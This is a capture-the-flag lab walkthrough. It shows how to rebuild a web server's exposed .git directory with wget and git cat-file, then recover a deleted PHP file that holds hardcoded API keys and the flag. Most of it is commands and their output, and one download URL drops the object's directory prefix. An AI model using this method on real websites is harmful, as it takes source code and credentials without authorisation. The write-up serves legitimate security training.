### Reflecting remote files and folders using local Git repository
https://github.com/bl4de/research/tree/master/hidden_directories_leaks#git

### Create dummy Git folder

```
$ git init
```


### Download the git log from the site.
`$ wget http://10.10.X.X/.git/logs/HEAD` 
`$ cat HEAD`
![[head.png]]

#### 79c9539b6566b06d6dec2755fdf58f5f9ec8822f Object
79 = Directory
c9539b6566b06d6dec2755fdf58f5f9ec8822f = Object

The developer removed the sensitive data on the object **b2f776a52fe81a731c6c0fa896e7f9548aafceab**. 
`79c9539b6566b06d6dec2755fdf58f5f9ec8822f b2f776a52fe81a731c6c0fa896e7f9548aafceab Context Information Security <recruitment@contextis.com> 1568122860 +0100 commit: removed sensitive data`


You can find the sensitive data in the object **79c9539b6566b06d6dec2755fdf58f5f9ec8822f**.
`93bab0a450caaa8c4d2632703636eccc69062bb4 79c9539b6566b06d6dec2755fdf58f5f9ec8822f Context Information Security <recruitment@contextis.com> 1568122828 +0100 commit: added basic prototype of api gateway`


### Extract the object from the target machine
- Create a directory called 79 into the **objects** dir.
- Download the "c9539b6566b06d6dec2755fdf58f5f9ec8822f" file to 79 dir.

```
$ mkdir 79
$ cd 79
$ wget http://10.10.X.X/.git/objects/79/c9539b6566b06d6dec2755fdf58f5f9ec8822f
```
### Read the content of the tree object 1
```
$ cd 79
$ git cat-file -p 79c9539b6566b06d6dec2755fdf58f5f9ec8822f
```
> tree **51d63292792fb7f97728cd3dcaac3ef364f374ba**
> parent 93bab0a450caaa8c4d2632703636eccc69062bb4
> author Context Information Security <recruitment@contextis.com> 1568122828 +0100
> committer Context Information Security <recruitment@contextis.com> 1568122828 +0100

You got a tree **object 51d63292792fb7f97728cd3dcaac3ef364f374ba**
- Create a directory called 51 into the **objects** dir.
- Download the "51d63292792fb7f97728cd3dcaac3ef364f374ba" file to 51 dir.
```
$ mkdir 51
$ cd 51
$ wget http://10.10.X.X/.git/objects/51/d63292792fb7f97728cd3dcaac3ef364f374ba
```

### Read the content of the tree object 2
```
$ cd 51
$ git cat-file -p 51d63292792fb7f97728cd3dcaac3ef364f374ba
```

> 100644 blob 2229eb414d7945688b90d7cd0a786fd888bcc6a4    api.php
> 100644 blob 9eb9f94f73113d785e65c7e3ec0cba54e0b7cf43    functions.php
> 100644 blob 2a116a56a6e31ef1836796936dbc05af1f986a26    home.php
> 100755 blob 470cac65fcd0f8556f13997957a331628482aa96    index.html
> 100644 blob 4f4ced90fcad774ca4f9f966dbb227ebe7f77a83    index.php
> 100644 blob 6480abf34a54d3055b437766be872a13bcebdf7d    info.php

The sensitive data is stored inside api.php or object **2229eb414d7945688b90d7cd0a786fd888bcc6a4**.

- Create a directory called 22 into the **objects** dir.
- Download the "29eb414d7945688b90d7cd0a786fd888bcc6a4" file to 22 dir.

```
$ mkdir 22
$ cd 22
$ wget http://10.10.X.X/.git/objects/2229eb414d7945688b90d7cd0a786fd888bcc6a4
```

### Read the content of the tree object 3
```
$ cd 22
$ git cat-file -p 2229eb414d7945688b90d7cd0a786fd888bcc6a4
```

```
<?php

require_once("functions.php");

if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "**GITtFi80llzs4TxqMWtCotiTZpf0HC**"))
{
    die("Invalid API key");
}

if (!isset($_GET['documentid']))
{
    die("Invalid document ID");
}

/*
if (!isset($_GET['newname']) || $_GET['newname'] == "")
{
    die("invalid document name");
}
*/

$conn = setup_db_connection();

//UpdateDocumentName($conn, $_GET['documentid'], $_GET['newname']);

$docDetails = GetDocumentDetails($conn, $_GET['documentid']);
if ($docDetails !== null)
{
    //print_r($docDetails);
    echo ("Document ID: ".$docDetails['documentid']."<br />");
    echo ("Document Name: ".$docDetails['documentname']."<br />");
    echo ("Document Location: ".$docDetails['location']."<br />");
}

?>                                                                                                                                                                           
```

The GIT flag is GITtFi80llzs4TxqMWtCotiTZpf0HC.